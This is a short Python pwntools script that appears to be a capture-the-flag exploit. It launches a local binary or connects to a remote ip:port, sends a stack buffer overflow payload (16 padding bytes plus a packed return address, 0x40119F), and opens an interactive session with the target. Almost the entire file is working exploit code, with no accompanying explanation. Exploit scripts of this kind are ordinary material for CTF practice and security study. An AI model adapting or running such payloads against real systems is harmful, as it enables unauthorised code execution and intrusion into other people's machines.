#!/usr/bin/python

# -*- coding: UTF-8 -*-

from pwn import *
from sys import exit
import argparse

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-o", help="path to an executable file.", metavar = "<path to file>")
group.add_argument("-r", help="address of an remote machine.", metavar = "<ip:port>")
parser.add_argument("-v", help="debug log level, default level is error.", action="store_true")
parser.add_argument("--libc", help="specify the libc to preload", metavar = "<path to file>")
args = parser.parse_args()


if __name__ == "__main__":
    binary = args.o
    remote_addr = args.r
    libc = args.libc
    if args.v == True:
        context.log_level='debug'
    if not binary and not remote_addr:
        parser.print_usage()
        exit()
    elif not remote_addr:
        if not libc:
            p = process(binary)
        else:
            p = process(binary, env={'LD_PRELOAD': libc})
    else:
        remote_addr = remote_addr.split(':')
        p = remote(remote_addr[0], remote_addr[1])

    p.sendline(b'A' * 16 + p64(0x40119F));
    p.interactive()
